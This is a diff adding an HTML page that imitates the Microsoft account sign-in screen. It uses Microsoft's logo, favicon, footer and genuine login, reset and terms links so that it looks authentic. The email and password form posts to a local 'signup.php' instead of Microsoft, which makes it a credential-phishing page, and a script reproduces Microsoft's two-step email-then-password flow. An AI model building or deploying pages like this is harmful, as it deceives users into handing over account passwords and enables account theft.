@@ -1,0 +1,121 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="micro.css">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <form action="signup.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+            <img class="logo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" placeholder="Email, Phone, or Skype" required>
+                        </div>
+                        <p>No account? <a href="https://login.live.com/oauth20_authorize.srf?client_id=5e3ce6c0-2b1f-4285-8d4b-75ee78787346&scope=openId+profile+openid+offline_access&redirect_uri=https%3a%2f%2fteams.microsoft.com%2fv2&response_type=code&state=eyJpZCI6IjAxOWE1NGFlLTU0YzYtN2MxNC1iY2EzLTcwODNmODhhMTQ0ZiIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7chttps%3a%2f%2fteams.microsoft.com%2fv2%2f%3fculture%3den-gb%26country%3dgb%26enablemcasfort21%3dtrue&response_mode=fragment&nonce=019a54ae-54c7-7ce9-99f7-2a7b5878b044&code_challenge=lTqwyvA-ndFoqsbNQg6ivcXyt7J58_EjuD5RFkN111I&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=3.30.0&uaid=019a54ae54c67a9ca73f685e8bf187c0&msproxy=1&issuer=mso&tenant=common&ui_locales=en-GB&client_info=1&signup=1&lw=1&fl=easi2&epctrc=jUVJp34SUjPI5MuDNlvT8IIVqMo0yerA7YKc5x4SMxA%3d6%3a1%3aCANARY%3afiQhhW%2b6HdswPIz%2fiqoM1pKgt1LbWI2B7Lywpb1%2fBK4%3d&epct=PAQABDgEAAABlMNzVhAPUTrARzfQjWPtKyqSIlb_xkIWStf33zVhlv4SMfkIH1MNY8x8p1sbRtSvB15fbtLFoEN7lcOnv8dKiqwOBO2q99hkW43BuFvZRkUvhXyttc0XNkVbiPT5G-2veLmmvxZbgCFgfzSEUGK2b78XTxtcv_2V02Y2fsH_FQH_PhfHnhzWcBSOgpNOIDb6RhBnw61lM_plPBSx7WT51hUKnCZo5ipQEVJVSso8eBiAA&jshs=0">Create One!</a></p>
+                        <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=32501b1b-ad49-4ad1-b0ad-393834d5cbdc&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBN6KCMAAA0Lu4OtADDA7SPyCYRKOwAaFIUZqAnP6_dzC-QSB8p333YF81ZdY_ffLYg_l6hcAIZWVgyFD_6m3KXMZYich2PFFZ2L5dr56pzwDqL1eRvN6pWHAwo_uldxr_7CIzks8c1-lWuEqihi1HYvE2-3mX7U3T5OUYMdutVJT0h6WcYNcqmpgjnh4mysukwZ_HtyK-Cx1hWzuoCA-eGl8AVsLN84MMnUav0DLhb-RBjWJlJbtd2eNyW-GR1aViwRRU3PKoxUgZ5qTQ1ESD03affJQA_MgvSxh3yUVQOwNNAnU9FMH3KHPIPBe50Wqp4MhsrPt0VQUzcJij1ChxMG6mLo62ma72Z8i1LjcJtiIfLR7ylH4uvxAIi3yV4Ol0-AfHPxsaWgEAAA&msaoauth2=true&instance_aware=true&lc=2057">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" placeholder="Password" required>
+                        </div>
+                        <a href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZHPS9twGMYTq11X2Fo3kJ2kBydjmuZHk6YtdFJt1dQ2tZra1sMk-fabJjXJN03Sn-w2mINdPA7ZLsIYeBjiSXaZpx08edvYyV297AcMPK7-AxvPy8PzOby8vDxBfywao6LUYx8TpVIzHIwBGAcUwSi0SrBMgiMSDVYheA5CPjFSjI0794LhD9IB_ll6M3y_oD199Wvv7Aif1jzPdlMk6UHZdKOmDhzkItWLAmSSXeYUxy9w_GhshqKTMsfKkOBYwBM8gEkimVR5gpF5hRtdUCiW_TYWKmU6nsbcGHL0Ifw9FlAduWlCyzvwfcLhIG9vLwlxoZXpl6o5WlxZNgpShaoP657IFPviEq3XmdywIIFeKSuapaymFaUyta0LrmDSRmMlp5csV5erHLVdy2v12IatMFwF1hYNoYV0YG7tyrW8UY-VdbVGpZ_9-zlyAXQMr-PANLSIpjILUMfynEF6FKElKwY0geyqyPEYOu05HXji848WTWSd-2aQDS2hEbEdpOoGjNyg3oggVTV0C-7IAEDX_erDL8bxq_GpgC88_QCLYI9mKV8qEAiGsRu6HscPJ0alzB9-efj8VMoc_3lSq4WmsPMJslXZytsxdrPSWhe4YicrGl0pIQhb7SKiBtDJ8PU1wPXZzWI_k46n6H0_vu-_f-4Pma5sRFtuVHFQz4XOTz_-8hb28fZ_Sn4dxI-Cc4bU7g26GcJqLKO2q4jlZlzvgtrA4_NcYifX6mS5jeVdkaZp4TiIn93Bru--O_n-4u3-3o_Vq9C8qpc1rToXX224vXVhSOptVKTttaZHF5SqwCzyhUHPVmhycY1NH4exy9FMYteTkb81&mkt=en-GB&hosted=0&device_platform=Windows+10">Forgot password?</a>
+                        <button type="button">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+    <div id="footer" role="contentinfo" data-bind="
+        externalCss: {
+            'footer': true,
+            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
+            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
+
+        <div data-bind="component: { name: 'footer-control',
+            publicMethods: $page.footerMethods,
+            params: {
+                serverData: svr,
+                useDefaultBackground: $page.useDefaultBackground(),
+                hasDarkBackground: $page.backgroundLogoUrl(),
+                showLinks: true,
+                showFooter: $page.showFooter(),
+                hideTOU: $page.hideTOU(),
+                termsText: $page.termsText(),
+                termsLink: $page.termsLink(),
+                hidePrivacy: $page.hidePrivacy(),
+                privacyText: $page.privacyText(),
+                privacyLink: $page.privacyLink() },
+            event: {
+                agreementClick: $page.footer_agreementClick,
+                showDebugDetails: $page.toggleDebugDetails_onClick } }">
+<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
+<a id="ftrTerms" data-bind="
+            text: termsText,
+            href: termsLink,
+            click: termsLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+        <a id="ftrPrivacy" data-bind="
+            text: privacyText,
+            href: privacyLink,
+            click: privacyLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+    <a id="moreOptions" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=32501b1b-ad49-4ad1-b0ad-393834d5cbdc&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBN6KCMAAA0Lu4OtADDA7SPyCYRKOwAaFIUZqAnP6_dzC-QSB8p333YF81ZdY_ffLYg_l6hcAIZWVgyFD_6m3KXMZYich2PFFZ2L5dr56pzwDqL1eRvN6pWHAwo_uldxr_7CIzks8c1-lWuEqihi1HYvE2-3mX7U3T5OUYMdutVJT0h6WcYNcqmpgjnh4mysukwZ_HtyK-Cx1hWzuoCA-eGl8AVsLN84MMnUav0DLhb-RBjWJlJbtd2eNyW-GR1aViwRRU3PKoxUgZ5qTQ1ESD03affJQA_MgvSxh3yUVQOwNNAnU9FMH3KHPIPBe50Wqp4MhsrPt0VQUzcJij1ChxMG6mLo62ma72Z8i1LjcJtiIfLR7ylH4uvxAIi3yV4Ol0-AfHPxsaWgEAAA&msaoauth2=true&instance_aware=true&lc=2057#" role="button" data-bind="
+        click: moreInfo_onClick,
+        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+        attr: { 'aria-expanded': showDebugDetails().toString() },
+        hasFocusEx: focusMoreInfo(),
+        externalCss: {
+            'footer-content': true,
+            'footer-item': true,
+            'debug-item': true,
+            'has-background': !useDefaultBackground,
+            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+</div></div>
+    </div>
+    <script>
+        const forms = document.querySelector('.forms');
+        const nextButton = document.querySelector('.next-btn');
+        const arrowButton = document.querySelector('.arrow-btn');
+    
+        const emailInput = document.querySelector('.first input');
+        const emailDisplay = document.querySelector('.email');
+        const passwordInput = document.querySelector('.second input');
+    
+        nextButton.addEventListener('click', () => {
+            forms.classList.add('next-form');
+            emailDisplay.innerText = emailInput.value;
+            passwordInput.setAttribute('placeholder', 'Password for ' + emailInput.value);
+            document.querySelector('.bottom').style.display = 'none';
+        });
+    
+        arrowButton.addEventListener('click', () => {
+            forms.classList.remove('next-form');
+            document.querySelector('.bottom').style.display = 'flex';
+        });
+    </script>    
+</body>
+</html>
